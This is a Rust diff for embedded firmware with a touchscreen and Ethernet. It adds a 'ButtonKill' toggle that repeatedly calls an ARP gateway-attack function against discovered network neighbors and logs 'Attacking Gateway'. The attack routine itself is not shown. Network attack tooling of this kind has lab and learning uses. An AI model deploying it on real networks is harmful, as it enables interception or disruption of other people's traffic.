@@ -180,6 +180,8 @@ fn main() -> ! {
     // Set the default Touch State
     let mut previous_touch_state = false;
 
+    let mut attack_gateway_v4_active = false;
+
     loop {
         // poll button state
         let current_button_state = pins.button.get();
@@ -376,7 +378,7 @@ fn main() -> ! {
                             let iface = &mut ethernet_interface.as_mut().unwrap();
                             
                             scroll_text.set_lines(vec!());
-                            
+
                             scroll_text.add_line(format!("MAC: {}", ETH_ADDR.to_string()));
                             
                             for addr in iface.ip_addrs() {
@@ -396,6 +398,20 @@ fn main() -> ! {
                                 });
 
                             scroll_text.draw(&mut layer_1);
+                        } else if item_ref == "ButtonKill" {
+                            let button_kill: &mut FUiElement = element_map.get_mut(&String::from("ButtonKill")).unwrap();
+
+                            if !attack_gateway_v4_active{
+                                button_kill.set_background_color(Color{red: 255, green: 0, blue: 0, alpha: 255});
+
+                                attack_gateway_v4_active = true;
+                            } else {
+                                button_kill.set_background_color(Color{red: 255, green: 165, blue: 0, alpha: 255});
+
+                                attack_gateway_v4_active = false;
+                            }
+                            
+                            button_kill.draw(&mut layer_1);
                         }
                     }
                 }
@@ -412,6 +428,21 @@ fn main() -> ! {
         if number_of_touches == 0{
             //println!("NO TOUCH");
             previous_touch_state = false;
+        }
+
+        if attack_gateway_v4_active{
+            if system_clock::ticks() % 100 == 0 {
+                let scroll_text: &mut FUiElement = element_map
+                    .get_mut(&String::from("ScrollText")).unwrap();
+                if !neighbors.is_empty() {
+                    network::arp::attack_gateway_v4(&mut ethernet_interface.as_mut().unwrap(), ETH_ADDR, &neighbors);
+                    scroll_text.add_line(String::from("Attacking Gateway"));
+                } else {
+                    scroll_text.set_lines(vec!(String::from("No valid neighbors to attack")));
+                }
+
+                scroll_text.draw(&mut layer_1);
+            }
         }
 
         // handle new ethernet packets
